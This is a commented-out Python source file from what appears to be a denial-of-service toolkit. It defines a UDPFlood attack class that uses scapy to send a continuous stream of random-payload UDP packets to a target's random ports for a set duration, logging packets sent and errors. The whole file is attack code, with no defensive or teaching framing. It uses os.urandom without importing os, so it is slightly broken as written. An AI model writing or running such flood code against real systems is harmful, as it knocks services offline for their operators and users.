# import time
# import asyncio
# import random
# from scapy.all import IP, UDP, Raw, send
# from .base import BaseAttack

# class UDPFlood(BaseAttack):
#     async def execute(self):
#         start_time = time.time()
#         target_ip = self.target.split("://")[-1].split("/")[0]
#         target_port = random.randint(1, 65535)  # Port ngẫu nhiên

#         packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=os.urandom(1024))
#         loop = asyncio.get_running_loop()

#         while time.time() - start_time < self.duration:
#             try:
#                 await loop.run_in_executor(None, lambda: send(packet, verbose=False))
#                 self.results["requests_sent"] += 1
#                 print(f"UDP Flood: Sent packet to {target_ip}:{target_port}")
#             except Exception as e:
#                 self.results["errors"] += 1
#                 print(f"UDP Flood error: {e}")
#             await asyncio.sleep(0.01)